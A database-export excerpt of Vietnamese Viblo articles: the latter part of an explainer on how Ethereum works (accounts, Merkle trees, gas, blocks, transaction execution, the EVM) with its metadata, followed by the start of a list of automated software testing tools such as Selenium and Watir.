động khác nhau (ví dụ: chuyển token, ghi vào bộ nhớ trong, thực hiện một số tính toán, tạo hợp đồng mới....).\n\nKhông giống như các tài khoản người dùng, các tài khoản hợp đồng không thể tự mình thực hiện các giao dịch mới. Thay vào đó, tài khoản hợp đồng chỉ có thể thực hiện giao dịch để đáp ứng với các giao dịch khác mà nó nhận được từ tài khoản người dùng hoặc từ tài khoản hợp đồng khác.\n\n![](https://images.viblo.asia/ff810dac-2ba7-4f7c-8503-cb0de6f5f9f7.png)\n\nDo đó, bất kỳ hành động nào xảy ra trên blockchain Ethereum luôn được thiết lập bởi các giao dịch được thực hiện từ các tài khoản người dùng.\n\n### Trạng thái của tài khoản\nTrạng thái tài khoản bao gồm bốn thành phần, nó đều có trong bất kỳ tài khoản nào:\n* nonce: Nếu tài khoản là tài khoản người dùng, con số này thể hiện số lượng giao dịch đã được gửi từ tài khoản. Nếu tài khoản là tài khoản hợp đồng, thì nonce là số lượng hợp đồng được tạo bởi nó.\n* balance (số dư): Số lượng wei tài khoản đang có ( 1 ether = 10^18 wei)\n* storageRoot: Giá trị băm của phần gốc (root) của cây Merkle Storage (sẽ giải thích về cây Merkle ở phần sau). Cây Merkle Storage chứa giá trị băm của các biến có trong Storage của tài khoản và theo mặc định là trống.\n* codeHash: Giá trị băm của mã hợp đồng ở dạng bytecode trong EVM . Đối với các tài khoản người dùng thì trường codeHash là chuỗi trống.\n\n![](https://images.viblo.asia/f0221a32-fdfb-4757-83ba-e90262040bb7.png)\n\n## Trạng thái toàn cục của Ethereum (global state)\nChúng ta đãi biết rằng trạng thái toàn cục của Ethereum, bao gồm ánh xạ giữa các địa chỉ tài khoản và trạng thái tài khoản. Ánh xạ này được lưu trữ trong một cấu trúc dữ liệu được gọi là cây Merkle.\n\nCây Merkle là một loại cây nhị phân gồm một tập hợp các nút có:\n* Các nút lá ở dưới cùng của cây có chứa dữ liệu cơ bản\n* Các nút trung gian, trong đó mỗi nút trung gian là giá trị băm hai nút con của nó\n* Một nút gốc duy nhất, cũng được hình thành từ hàm băm của hai nút con của nó, đại diện cho đỉnh của cây.\n\n![](https://images.viblo.asia/cdcbb70d-0579-4f98-8237-9488a252ba53.png)\n\nDữ liệu ở dưới cùng của cây được tạo bằng cách chia dữ liệu mà chúng ta muốn lưu trữ thành các khối, chia các khối thành các nhóm, sau đó lấy hàm băm của mỗi nhóm và lặp lại quy trình tương tự cho đến khi tính ra 1 giá trị băm duy nhất (nút gốc của cây Merkle).\n\n![](https://images.viblo.asia/0950c929-7af3-424d-9481-7dc9e95057c0.png)\n\n![](https://images.viblo.asia/3679595c-7d8c-4e5a-8b90-e8c23d18fe18.png)\n\nCấu trúc cây Merkle này cũng được sử dụng để lưu trữ các giao dịch và biên lai. Cụ thể hơn, mọi block có một header , nơi lưu trữ hàm băm gốc (rootHash) của ba cấu trúc cây Merkle khác nhau, bao gồm:\n* State tree\n* Transaction tree\n* Receipts tree\n\nKhả năng lưu trữ tất cả thông tin này một cách hiệu quả ở cây Merkle vô cùng hữu ích trong Ethereum với những nút không đầy đủ trong mạng (light nodes hay light cliens). Nên biết rằng trong ethereum về cơ bản có 2 loại nút: đầy đủ (full nodes) và không đầy đủ (light nodes).\n\nMột nút đầy đủ là nút đồng bộ hóa toàn bộ cơ sở dữ liệu của mạng blockchain, từ block nguyên thủy đến block hiện tại.Thông thường, các thợ đào là nút đầy đủ, bởi vì họ được yêu cầu làm như vậy cho quá trình khai thác.\n\nNhưng trừ khi một nút cần thực hiện mọi giao dịch hoặc dễ dàng truy vấn dữ liệu lịch sử, thì thực sự không cần phải lưu trữ toàn bộ chuỗi block. Đây là nơi xuất hiện khái niệm nút không đầy đủ. Thay vì tải xuống và lưu trữ toàn bộ cơ sở dữ liệu của blockchain, các nút không đầy đủ chỉ tải xuống header của tất cả block , từ block nguyên thủy đến block hiện tại. Vì các nút không đầy đủ có  các header của toàn bộ block, chúng vẫn có thể dễ dàng xác thực và kiểm chứng về các giao dịch, sự kiện, số dư, ....\n\nLý do là vì giá trị băm trong cây Merkle được tính toán từ dưới  lên trên - nếu người dùng xấu cố gắng thay đổi một giao dịch không hợp lệ vào dưới cùng của cây Merkle, thay đổi này sẽ gây ra thay đổi băm của nút ở trên, các nút ở trên lại cũng sẽ thay đổi hàm băm của nút ở trên nó, và cứ thế, cho đến khi cuối cùng nó thay đổi gốc của cây.\n\n![](https://images.viblo.asia/df8672bc-3425-46d2-8dfe-905c1598f023.png)\n\nBất kỳ nút nào muốn xác minh một phần dữ liệu đều có thể sử dụng một cơ chế có tên gọi là “Merkle proof”. Một Merkle proof bao gồm:\n* Phần dữ liệu cần xác minh và hàm băm của nó\n* Giá trị băm của gốc trong cây Merkle\n* Tất cả các nút trong cây cần thiết để tính ra rootHash từ nút lá cần xác minh\n\n![](https://images.viblo.asia/e9478891-09d1-4982-8e4c-22918f4428aa.png)\n\nDữ liệu sẽ được xác mình là đúng khi rootHash tính ra được đúng bằng rootHash của cây.\n\nTóm lại, lợi ích của việc sử dụng cây Merkle là nút gốc của cấu trúc này phụ thuộc vào các hàm băm dữ liệu được lưu trữ trong cây và do đó, hàm băm của nút gốc có thể được sử dụng xác minh dữ liệu, chống việc thay đổi trái phép. Vì tiêu đề khối bao gồm hàm băm gốc của State Tree, Transaction Tree và Receipts Tree, bất kỳ nút nào cũng có thể xác thực một phần nhỏ trạng thái của Ethereum mà không cần lưu trữ toàn bộ trạng thái và tiết kiệm được không gian lưu trữ.\f\n\n## Gas và Thanh toán chi phí giao dịch\nMột khái niệm rất quan trọng trong Ethereum là khái niệm về phí giao dịch. Mọi tính toán xảy ra trên mạng Ethereum đều phải trả phí - không có gì miễn phí cả ! Khoản phí này được trả theo mệnh giá gọi là gas.\n\nGas là đơn vị được sử dụng để đo lường các khoản phí cần thiết cho một tính toán cụ thể. Gas Price là lượng Ether bạn sẵn sàng chi cho mỗi đơn vị gas.\n\nVới mỗi giao dịch, người gửi đặt Gas Limit và Gas Price. Hai thông số này thể hiện số lượng gas mà người dùng sẵn sàng chi trả tối đa cho một giao dịch.\n\nVí dụ: giả sử người gửi đặt Gas Limit là 50.000 và giá gas là 20 gwei. Điều này ngụ ý rằng người gửi sẵn sàng chi tối đa 50.000 x 20 gwei = 1.000.000.000.000.000 Wei = 0,001 Ether để thực hiện giao dịch đó.\n\n![](https://images.viblo.asia/59aada1f-f5f5-409d-91ba-f84d90dfcb58.png)\n\nHãy nhớ rằng Gas Limit đại diện cho lượng gas tối đa mà người gửi sẵn sàng trả cho giao dịch đó. Nếu giao dịch tiêu thụ một lượng Gas thấp hơn Gas Limit thì người dùng sẽ được hoàn trả vào cuối giao dịch.\n\n![](https://images.viblo.asia/4d948697-20f2-4b72-9d9f-1bc76cce15e2.png)\n\nTrong trường hợp người gửi không cung cấp đủ lượng Gas cần thiết để thực hiện giao dịch, giao dịch sẽ ‘bị hết gas’ và được coi là không hợp lệ. Trong trường hợp này, việc hủy bỏ xử lý giao dịch và bất cứ thay đổi trạng thái nào xảy ra đều sẽ bị đảo ngược (revert). Ngoài ra, một bản ghi về giao dịch không thành công được ghi lại, cho thấy giao dịch nào đã được thử và nơi mà nó không thành công. Và máy ảo Ethereum đã dùng lượng Gas chạy các tính toán trước khi hết Gas, nên người dùng sẽ không được hoàn trả lại lượng Gas.\n\n![](https://images.viblo.asia/9e185bf1-5e68-41d9-9bb8-5628266282ab.png)\n\nChính xác thì lượng Gas này chạy đi đâu? Tất cả số tiền chi cho Gas của người gửi được gửi đến địa chỉ thợ đào tìm ra block chứa giao dịch đó. Vì các thợ đào nỗ lực để chạy các tính toán và xác thực các giao dịch, các thợ đào nhận được phí gas như một phần thưởng ngoài phần thưởng mà họ nhận được khi đào ra một block hợp lệ.\n\n![](https://images.viblo.asia/01c63d8c-6ad7-4914-bc46-69a79d736394.png)\n\nThông thường, giá Gas mà người gửi sẵn sàng trả càng cao, giá trị mà người thợ đào nhận được từ giao dịch càng lớn. Vì vậy, các thợ đào có nhiều khả năng sẽ chọn nó. Vì các thợ đào có thể tự do lựa chọn giao dịch nào họ muốn xác thực hoặc bỏ qua. Vì  vậy nếu bạn đặt Gas Price và Gas Limit quá thấp, thì có thể giao dịch của bạn sẽ mất rất lâu để có thể được xác nhận và đưa vào blockchain.\n\n### Phí trả cho lưu trữ\nGas không chỉ được sử dụng để thanh toán cho các bước tính toán, nó còn được sử dụng để thanh toán cho lưu trữ. Bảng dưới đây thể hiện lượng Gas phải trả cho phí lưu trữ cho Ethereum.\n\n![](https://images.viblo.asia/0b1a01a5-3e0d-404b-9602-5bbf0b5fc592.png)\n\n### Vậy mục đích của phí giao dịch là gì ?\nCác bước tính toán trên Máy ảo Ethereum rất tốn kém. Do đó, hợp đồng thông minh Ethereum được sử dụng tốt nhất cho các tác vụ đơn giản, như chạy logic business đơn giản, xác minh chữ ký,... thay vì sử dụng các tác vụ phức tạp hơn, như lưu trữ tệp, email hoặc học máy, có thể gây quá tải cho mạng. Áp dụng phí ngăn người dùng cố tính sử dụng các tác vụ nặng đó.\n\nNền tảng Ethereum được xây dựng với một ngôn ngữ hoàn chỉnh Turing (Turing-Complete). Nói đơn giản, ngôn ngữ Turing hoàn chỉnh là ngôn ngữ có thể mô phỏng bất kỳ thuật toán máy tính nào. Điều này cho phép các vòng lặp và khiến Ethereum dễ gặp phải vấn đề sự cố dừng (Halting problem) , một vấn đề mà bạn gặp phải khác nếu không có phí giao dịch là một người dùng xấu có thể dễ dàng phá vỡ mạng bằng cách thực hiện một vòng lặp vô hạn trong một giao dịch, mà không có gặp trở ngại nào. Do đó, phí giao dịch bảo vệ mạng khỏi các cuộc tấn công có chủ đích.\n\n## Giao dịch và message\nChúng ta đã biết rằng Ethereum là một máy trạng thái dựa trên các giao dịch. Nói cách khác, các giao dịch xảy ra giữa các tài khoản khác nhau là lúc trạng thái toàn cục của Ethereum được chuyển từ trạng thái này sang trạng thái khác.\n\nCó hai loại giao dịch: mesage calls và contract creator (nghĩa là giao dịch tạo hợp đồng Ethereum mới).\n\nTất cả các giao dịch có chứa các thành phần sau:\n* nonce: Số lượng giao dịch đã được gửi bởi người gửi (giao dịch hợp lệ).\n* Giá gas (gasPrice): Số wei phải trả cho 1 gas.\n* Giới hạn Gas (gasLimit): Số gas tối đa mà người gửi sẵn sàng trả cho giao dịch.\n* to: Địa chỉ tài khoản nhận giao dịch.\n* value: số wei mà tải khoản người gửi gửi cho tài khoản nhận.\n* v, r, s: các thông số được tạo ra từ thuật toán ECDSA giúp cho các nút trong mạng có thể xác thực chữ ký số của người gửi.\n* init (chỉ có ở trong giao dịch tạo hợp đồng): Một đoạn mã EVM được sử dụng để khởi tạo tài khoản hợp đồng mới. init chỉ được chạy một lần và sau đó bị loại bỏ.\n* data: dữ liệu đầu vào (tức là các tham số) của message calls. Ví dụ: nếu gọi một hàm trong hợp đồng thông minh có tham số đầu vào là kiểu uint thì data sẽ là một số nguyên dương.\n\n![](https://images.viblo.asia/66e482b6-9492-4471-a0f3-bc6b5af202ad.png)\n\nNhìn một cách tổng quan, tất cả giao dịch trên mạng Ethereum đều bắt đầu từ một tài khoản người dùng nào đó. Dù là một lời gọi hàm, một giao dịch từ một hợp đồng thông minh này đến một hợp đồng thông mình khác thì cũng sẽ phải được kích hoạt bởi một tài khoản người dùng.\n\n![](https://images.viblo.asia/0b0e9f5b-2e9d-47fb-b33f-a1ba4b897ecc.png)\n\nMột điều quan trọng cần lưu ý là các giao dịch internal (giao dịch giữa các hợp đồng với nhau) hoặc các message không có chứa gasLimit. Điều này là do gasLimit được xác định bởi chủ của giao dịch gốc.GasLimit của các tài khoản người dùng phải đủ lớn để thực hiện giao dịch, bao gồm mọi thực hiện các giao dịch phái sinh, chẳng hạn như các message giữa các hợp đồng. Nếu, trong chuỗi các giao dịch và message, khi thực thi một message cụ thể bị hết gas, thì message đấy sẽ bị revert. Tuy nhiên, việc thực thi các giao dịch và message trước đó không cần revert.\n\n## Block\nTất cả các giao dịch được nhóm lại với nhau thành các block trên mạng. Một blockchain chứa một chuỗi các block như vậy được nối với nhau.\n\nTrong Ethereum, một block bao gồm:\n* Block header\n* Thông tin về tất cả giao dịch được gom trong block đó\n* Các ommers của nó (hay còn gọi là uncle block)\n\n### Giải thích về Ommers\nDo cách thức Ethereum được xây dựng, thời gian khai thác một block thấp hơn nhiều (~ 15 giây) so với các blockchain khác, như Bitcoin (~ 10 phút). Điều này cho phép xử lý giao dịch nhanh hơn. Tuy nhiên, một trong những nhược điểm của thời gian khai thác một block ngắn là sẽ có nhiều thợ mỏ đào ra 1 block trong những khoàng thời gian rất gần nhau nhưng chỉ có một block được tìm ra sớm nhất được đưa vào nhánh chính, vì vậy sẽ rất lãng phí với các block khác vì chúng cũng hợp lệ nhưng lại không được đưa vào nhánh chính vì chậm hơn về mặt thời gian (1 đến 2 giây !). Các khối như vậy được gọi là các block mồ côi (orphaned blocks) hoặc uncle blocks.\n\nMục đích của ommers là để thưởng cho những người khai thác những khối mồ côi này. Các ommers phải là hợp lệ, nghĩa là một block trong nhánh chính chỉ được có tối đa 2 ommer, ngoài ra, một ommer được xác nhận là hợp lệ khai nó ở trong 6 thế hệ so với block hiện tại và các ommer chỉ được giới hạn 6 ommer trong 6 thế hệ. Các block Ommer nhận được phần thưởng nhỏ hơn một block trong nhánh chính.\n\n![](https://images.viblo.asia/45f76369-166c-411d-bc30-4ca879150468.png)\n\n![](https://images.viblo.asia/688b8569-20a2-40fd-92b0-a389c6238c3e.png)\n\nNhư hình trên, block ommer 3’ nằm ngoài 6 thế hệ do với block hiện tại (block 10) nên không được chấp nhận, block 10’ cũng không được chấp nhận do đã có đủ 6 ommer.\n\n### Tiêu đề block (block header)\nTiêu đề block là một phần của block bao gồm:\n* parentHash: Giá trị băm block header của block phía trước. \n* ommersHash: Giá trị băm của các block uncle\n* beneficiary: Địa chỉ tài khoản của thợ đào sẽ nhận phần thưởng từ block\n* stateRoot:Giá trị băm nút gốc của cây trạng thái\n* transactionRoot: Giá trị băm nút gốc của cây Merkle tất cả giao dịch có trong block\n* receipts: Giá trị băm nút gốc của cây receipt \n* logsBloom: Cấu trúc dữ liệu Bloom Filter\n* difficulty: Độ khó của block\n* number: Số thứ tự của block, tình từ block nguyên thủy là 0\n* gasLimit: Giá trị gas tối đa có thể sử dụng của các giao dịch trong block\n* gasUsed: Tổng số gas mà các giao dịch trong block tiêu thụ\n* timestamp: Thời gian block được tìm ra (tính theo unix timestamp)\n* extraData: Dữ liệu bổ sung liên quan đến khối\n* mixHash: hàm băm của block header trước khi tìm ra số nonce.\n* nonce: Khác với số nonce trong giao dịch, đây là số nonce mà thợ đào cần tìm trong quá trình đào block. Block được khai thác thành công khi số băm keccack256 mixHash và số nonce bé hơn một giá trị mục tiêu cho trước.\n\n![](https://images.viblo.asia/f556377f-4ebd-4fbc-9816-1da8dc453dff.png)\n\n## Quá trình thực thi giao dịch\nGiả sử bạn gửi một giao dịch vào mạng Ethereum để được xử lý. Điều gì xảy ra ?\n\n![](https://images.viblo.asia/25867786-79dd-494e-aec3-2fb783813445.png)\n\nĐầu tiên, tất cả các giao dịch phải đáp ứng một bộ yêu cầu ban đầu để được thực hiện. Bao gồm:\n* Giao dịch phải định dạng ở chuẩn encode RLP (Recursive Length Prefix)\n* Chữ ký giao dịch là hợp lệ.\n* Số nonce trong giao dịch phải bằng số nonce của tài khoản gửi giao dịch\n* gasLimit phải bằng hoặc lớn hơn instrinsic gas được sử dụng trong giao dịch. instrinsic gas (là lượng gas mà giao dịch sử dụng trước khi chạy bất cứ đoạn mã nào) bao gồm:\n\n1. Chi phí được xác định trước là 21.000 gas để thực hiện giao dịch.\n2. Một khoản phí gas cho dữ liệu được gửi cùng với giao dịch (4 gas cho một zero-byte hoặc 68 gas cho mỗi non-zeros byte).\n3. Nếu giao dịch là giao dịch tạo hợp đồng, thêm 32.000 gas.\n\n![](https://images.viblo.asia/d099413a-3188-4054-9a21-20c50cf639c3.png)\n\nSố dư tài khoản của người gửi phải có đủ Ether để trang trải chi phí gas trả trước mà người gửi phải trả. Cách tính chi phí gas trả trước rất đơn giản: Đầu tiên, GasLimt được nhân với Gas Price để xác định chi phí gas tối đa. Sau đó, chi phí tối đa này được cộng thêm với số ether mà người gửi gửi cho người nhận.\n\n![](https://images.viblo.asia/29f6eff6-7a89-4e26-a68b-e1aca533632d.png)\n\nTiếp theo, giao dịch bắt đầu thực hiện. Trong suốt quá trình thực hiện giao dịch, Ethereum theo dõi substate. Các substate này là một cách để ghi lại thông tin trong quá trình giao dịch sẽ cần ngay sau khi giao dịch hoàn tất. Cụ thể, nó chứa:\n* Self-destruct set: một tài khoản (nếu có) sẽ bị loại xóa sau khi giao dịch hoàn tất.\n* Log series: nhật ký việc mã code được thực thi trong máy ảo Ethereum\n* Refund balance: số tiền được hoàn trả vào tài khoản người gửi sau khi giao dịch. Việc lưu trữ trong Ethereum rất tốn kém và người gửi được hoàn lại tiền để xóa dung lượng lưu trữ? Ethereum theo dõi điều này bằng cách sử dụng một bộ đếm hoàn trả (refund counter). Refund counter bắt đầu từ 0 và tăng lên mỗi khi hợp đồng xóa thứ gì đó trong bộ lưu trữ (storage).\n\nTiếp theo, các tính toán khác nhau theo yêu cầu của giao dịch sẽ được xử lý.\n\nKhi tất cả các bước theo yêu cầu của giao dịch đã được xử lý và tất cả đều hợp lệ, trạng thái được hoàn thành bằng cách xác định lượng gas không sử dụng để hoàn trả cho người gửi. Ngoài lượng gas chưa sử dụng, người gửi cũng được hoàn lại một khoản trợ cấp (Refund balance) như đã đề cập ở trên.\nKhi người gửi được hoàn lại tiền:\n* Ether quy đổi từ gas sẽ được thợ đào tìm ra block chứa giao dịch thụ hưởng.\n* Tổng lượng gas sử dụng cho giao dịch sẽ được đưa vào block gas counter (nhằm tính tổng lượng gas tiêu thụ của block chứa giao dịch).\n* Tất cả tài khoản self-destruct set (nếu có) sẽ bị xóa.\n\nBây giờ, chúng ta hãy cùng xem xét một số khác biệt giữa các giao dịch tạo hợp đồng và giao dịch message calls.\n\n### Giao dịch tạo hợp đồng\nHãy nhớ lại rằng trong Ethereum, có hai loại tài khoản: tài khoản hợp đồng và tài khoản người dùng. Khi chúng ta nói một giao dịch là tạo hợp đồng, thì ngụ ý rắng mục đích của giao dịch là tạo một tài khoản hợp đồng mới.\n\nĐể tạo một tài khoản hợp đồng mới, trước tiên chúng tôi khai báo địa chỉ của tài khoản mới bằng một công thức đặc biệt. Sau đó, chúng tôi khởi tạo tài khoản mới bằng cách:\n* Đặt nonce bằng 0.\n* Nếu người gửi đã gửi một số lượng Ether dưới dạng giá trị với giao dịch, thì số dư tài khoản của hợp đồng bằng giá trị giao dịch.\n* Khấu trừ số dư tài khoản người tạo hợp đồng đi một lượng bằng số dư của hợp đồng.\n* Storage trống.\n* codeHash của hợp đồng là một chuỗi trống.\n\nKhi đoạn mã khởi tạo hợp đồng được thực thi, nó tiêu thụ một lượng gas. Giao dịch không được phép sử dụng nhiều gas hơn lượng gas còn lại. Nếu như vậy, thì trạng thái được revert về thời điểm ngay trước khi giao dịch. Người gửi không được hoàn trả lượng gas đã sử dụng trước khi hết.\n\nTuy nhiên, nếu người gửi gửi bất kỳ giá trị Ether nào cùng với giao dịch, giá trị Ether sẽ được hoàn trả ngay cả khi việc tạo hợp đồng không thành công.\n\nNếu mã khởi tạo thực thi thành công, chi phí cuối cùng cần phải chi trả là chi phí lưu trữ. Chi phí lưu trữ và tỷ lệ thuận với kích thước mã nguồn của hợp đồng đã tạo (một lần nữa, không có cái gì là miễn phí !) Nếu không đủ gas để trả chi phí cuối cùng này, thì giao dịch sẽ bị revert.\n\nNếu mọi việc suôn sẻ , thì lượng gas chưa sử dụng sẽ được hoàn trả cho người gửi ban đầu của giao dịch và trạng thái thay đổi hiện được phép tồn tại.\n\n### Message calls\nViệc thực hiện một message calls tương tự như việc tạo hợp đồng, nhưng có một chút khác biệt ở đây.\n\nThực thi một message calls không bao gồm bất kỳ đoạn mã init nào (xem ở phần giao dịch và message), vì không có tài khoản mới nào được tạo. Tuy nhiên, nó có thể chứa dữ liệu đầu vào, nếu dữ liệu này được cung cấp bởi người gửi giao dịch. Sau khi thực hiện, các message calls cũng có một thành phần bổ sung chứa dữ liệu đầu ra, được sử dụng nếu lần thực hiện tiếp theo cần dữ liệu này.\n\nCũng như việc tạo hợp đồng, nếu thực thi message calls hết gas hoặc vì giao dịch không hợp lệ (ví dụ: tràn ngăn xếp, lệnh jump không hợp lệ ...), thì không có gas nào đã sử dụng được hoàn trả cho người gọi ban đầu. Thêm vào đó, tất cả lượng gas chưa sử dụng còn lại được tiêu thụ và trạng thái được revert về điểm ngay trước khi chuyển số dư.\n\nCho đến bản cập nhật gần đây nhất của Ethereum, không có cách nào để ngăn chặn hoặc revert việc thực hiện giao dịch mà không khiến hệ thống tiêu thụ hết lượng gas bạn cung cấp. Ví dụ: giả sử bạn đã tạo một hợp đồng gây ra lỗi khi người gọi không được ủy quyền để thực hiện một số giao dịch. Trong các phiên bản trước của Ethereum, lượng gas còn lại vẫn sẽ được tiêu thụ và không có gas nào được hoàn trả cho người gửi. Nhưng bản cập nhật Byzantium bao gồm đoạn mã revert mới, cho phép hợp đồng dừng thực thi và revert các thay đổi trạng thái, mà không tiêu thụ lượng gas còn lại và với khả năng trả lại lý do cho giao dịch thất bại. Nếu một giao dịch bị revert, thì lượng gas chưa sử dụng được trả lại cho người gửi.\n\n### Ethereum Virtual Machine (EVM)\nCho đến nay, chúng ta đã tìm hiểu về một loạt các bước phải thực hiện để giao dịch được thực hiện từ đầu đến cuối. Bây giờ, chúng ta hãy cùng xem xét cách giao dịch thực sự được thực hiện trong EVM.\n\nEVM là một máy ảo Turing Complete. Điểm khác biệt giữa EVM và một máy ảo Turing Complete điển hình là nó cần gas để thực thi các bước tính toán, và đó là một hạn chế. Do đó, tổng số lượng tính toán có thể được thực hiện bị giới hạn bởi lượng gas được cung cấp.\n\n![](https://images.viblo.asia/73846810-e118-4231-bd7b-ccfe2bd24a13.png)\n\nEVM có kiến trúc dựa trên ngăn xếp.Chạy theo nguyên tắc First in Last out.\n\nKích thước của mỗi ngăn xếp trong EVM là 256-bit và ngăn xếp có kích thước tối đa là 1024.\n\nEVM có memory, dữ liệu được lưu trữ dưới dạng các mảng byte. Memory không ổn định, có nghĩa dữ liệu trong memory không được lưu trữ lâu dài.\n\nEVM cũng có storage. Không giống như memory, storage không biến động và được duy trì như một phần của trạng thái hệ thống. EVM lưu mã chương trình riêng biệt, trong một ROM ảo chỉ có thể được truy cập thông qua các lệnh đặc biệt. Khác với các máy tính theo kiến trúc von Neumann điển hình, trong đó mã chương trình được lưu trữ trong memory hoặc storage.\n\n![](https://images.viblo.asia/74821cc3-97ff-428e-81fb-323a21bc0215.png)\n\nEVM cũng có ngôn ngữ của nó: “EVM bytecode”. Khi viết các hợp đồng thông minh hoạt động trên Ethereum, chúng ta thường viết mã bằng ngôn ngữ bậc cao như Solidity hay Vyper. Sau đó chúng được biên dịch bytecode mà EVM có thể hiểu được.\n## Kết luận\nChúng ta đã cùng đi qua một loạt các khái niệm và kiến thức về mạng blockchain Ethereum, hy vọng sau bài viết này. Mọi người sẽ có cái nhìn rõ hơn, chân thực hơn về Ethereum hoạt động như thế nào.\n\n## Tài liệu tham khảo\n- Bài viết được lược dịch từ blog [How Ethereum work, anyway ?](https://medium.com/@preethikasireddy/how-does-ethereum-work-anyway-22d1df506369) \n- [Yellow paper Ethereum](https://gavwood.com/paper.pdf)\n- Kênh youtube [Block Dev](https://www.youtube.com/channel/UC6dbBV2jyaOV-3b3Tboul9w)	![](https://images.viblo.asia/cbed034e-0379-46fb-8897-dfac2affc524.png)\n\n\nGiới thiệu\nTrong cộng đồng Blockchain nói riêng cũng như những người không chuyên nói chung, thì Ethereum là cái tên nổi tiếng thứ 2 sau Bitcoin. Khác với Bitcoin là hệ thống tiền điện tử ngang hàng (Blockchain 1.0), Ethereum cho phép người tham gia có thể xây dựng những ứng dụng trên nền tảng này dựa trên hợp đồng thông minh (smart contract), đem các ứng dụng của Blockchain thoát ra khỏi sự đ...	{https://images.viblo.asia/cbed034e-0379-46fb-8897-dfac2affc524.png,https://images.viblo.asia/b0195ff4-3838-4ba4-9617-02900dc0bad9.png,https://images.viblo.asia/b0195ff4-3838-4ba4-9617-02900dc0bad9.png,https://images.viblo.asia/748a44d9-e4a0-48e9-8e9b-63abe397abd1.png,https://images.viblo.asia/e6b4e434-5230-4467-b0d2-4b934937c435.png,https://images.viblo.asia/22deaf79-abe8-482c-a31c-0cbb99e32f6a.png,https://images.viblo.asia/07060d01-b52a-4d0a-881e-19eb4a2f2f14.png,https://images.viblo.asia/ff810dac-2ba7-4f7c-8503-cb0de6f5f9f7.png,https://images.viblo.asia/f0221a32-fdfb-4757-83ba-e90262040bb7.png,https://images.viblo.asia/cdcbb70d-0579-4f98-8237-9488a252ba53.png,https://images.viblo.asia/0950c929-7af3-424d-9481-7dc9e95057c0.png,https://images.viblo.asia/3679595c-7d8c-4e5a-8b90-e8c23d18fe18.png,https://images.viblo.asia/df8672bc-3425-46d2-8dfe-905c1598f023.png,https://images.viblo.asia/e9478891-09d1-4982-8e4c-22918f4428aa.png,https://images.viblo.asia/59aada1f-f5f5-409d-91ba-f84d90dfcb58.png,https://images.viblo.asia/4d948697-20f2-4b72-9d9f-1bc76cce15e2.png,https://images.viblo.asia/9e185bf1-5e68-41d9-9bb8-5628266282ab.png,https://images.viblo.asia/01c63d8c-6ad7-4914-bc46-69a79d736394.png,https://images.viblo.asia/0b1a01a5-3e0d-404b-9602-5bbf0b5fc592.png,https://images.viblo.asia/66e482b6-9492-4471-a0f3-bc6b5af202ad.png,https://images.viblo.asia/0b0e9f5b-2e9d-47fb-b33f-a1ba4b897ecc.png,https://images.viblo.asia/45f76369-166c-411d-bc30-4ca879150468.png,https://images.viblo.asia/688b8569-20a2-40fd-92b0-a389c6238c3e.png,https://images.viblo.asia/f556377f-4ebd-4fbc-9816-1da8dc453dff.png,https://images.viblo.asia/25867786-79dd-494e-aec3-2fb783813445.png,https://images.viblo.asia/d099413a-3188-4054-9a21-20c50cf639c3.png,https://images.viblo.asia/29f6eff6-7a89-4e26-a68b-e1aca533632d.png,https://images.viblo.asia/73846810-e118-4231-bd7b-ccfe2bd24a13.png,https://images.viblo.asia/74821cc3-97ff-428e-81fb-323a21bc0215.png}	1	Ethereum hoạt động như thế nào ?	{blockchain,ethereum}	0	f	2022-12-18 15:33:38.278+00	2022-12-18 15:33:38.278+00
31941	# [12) Automai AppVerify](https://www.automai.com/continuous-testing)\n![](https://images.viblo.asia/e98aa342-89af-41af-81ff-d13106945779.png)\n\nAutomai AppVerify cung cấp kiểm thử tự động liên tục với độ chính xác 100% từ bên ngoài. Hỗ trợ kịch bản không mã hóa và trực quan cho phép bạn xây dựng các kịch bản phức tạp mà không cấn kịch bản mẫu trước đó. Hoạt động với tất cả các quy trình hoạt động thông qua Citrix, ứng dụng web hoặc ứng dụng fat client.\n\nCác tính năng chính:\n\n* Kịch bản không cần mã hóa\n* Kiểm tra tất cả các trường hợp kiểm thử của bạn nhanh hơn\n* Xác định kết quả của bạn với các điểm xác nhận.\n* Đảm bảo làm việc với mọi môi trường: Citrix, web, fat client\n* Biết các bài kiểm thử có đang đáp ứng nhu nghiệp vụ hiện tại của bạn không\n* Xác định tập lệnh kiểm thử và dữ liệu kiểm thử nào đang được sử dụng\n* Tiếp tục kiểm thử nhất quán trên các dự án\n\n# [13) Selenium](https://www.guru99.com/selenium-tutorial.html)\n\n![](https://images.viblo.asia/815ff80a-15a2-4f04-991d-d843e08edcdf.jpg)\nSelenium là một công cụ tự động với mã nguồn mở, hiện đang là công cụ được sử dụng rộng rãi trên thị trường. Nó có thể tự động hóa trên nhiều hệ điều hành như Windows, Mac và Linux và các trình duyệt như Firefox, Chrome, IE, cũng như Trình duyệt không đầu.\n\nKịch bản kiểm thử Selenium có thể được viết bằng các ngôn ngữ lập trình như Java, C #, Python, Ruby, PHP, Perl và JavaScript. Selenium cung cấp các tính năng ghi và mở lại với  bổ trợ trình duyệt Selenium IDE. Selenium WebDriver hỗ trợ mạnh mẽ giúp bạn tạo các tập lệnh tự động hóa phức tạp và nâng cao.\n\n[Tìm hiểu thêm về Selenium](https://www.guru99.com/selenium-tutorial.html)\n\n# [14) HP UFT (còn gọi là QTP)](https://www.guru99.com/quick-test-professional-qtp-tutorial.html)\n![](https://images.viblo.asia/d4226e69-1cb5-454d-966e-74440311edd5.png)\n\nHPE Unified Functional Test là công cụ kiểm thử tự động đa nền tảng hàng đầu. Nó có thể tự động hóa Web, Desktop, SAP, Delphi, Net, ActiveX, Flex, Java, Oracle, Mobile, PeopleSoft, PowerBuilder, Siebel, Stingray, Visual Basic trong tất cả các ứng dụng khác. Danh sách các môi trường phát triển nó có thể áp dụng là rất lớn!\n\nUFT sử dụng VBScript làm ngôn ngữ kịch bản.\n\nCông cụ này được tích hợp chặt chẽ với HP ALM (Công cụ quản lý kiểm thử) và HP LoadRunner (Công cụ kiểm thử hiệu suất)\n\nMột số tính năng nổi bật của UFT bao gồm Kiểm thử quy trình nghiệp vụ, khung điều khiển từ khóa, hỗ trợ XML, điểm kiểm thử mạnh mẽ, cho  ra kết quả kiểm thử.\n\n[Tìm hiểu thêm về HP - UFT.](https://www.guru99.com/quick-test-professional-qtp-tutorial.html)\n\n# [15) Watir](http://watir.com/)\n\n![](https://images.viblo.asia/d07f93c7-ac57-4e97-897a-80d341fdd7f4.png)\nWatir là một kiểm thử tự động web với mã nguồn mở. Nó được phát âm là "water."\n\nWatir hỗ trợ IE trên windows. Watir + WebDriver hỗ trợ HTML trên trình duyệt FireFox, Opera và  headless 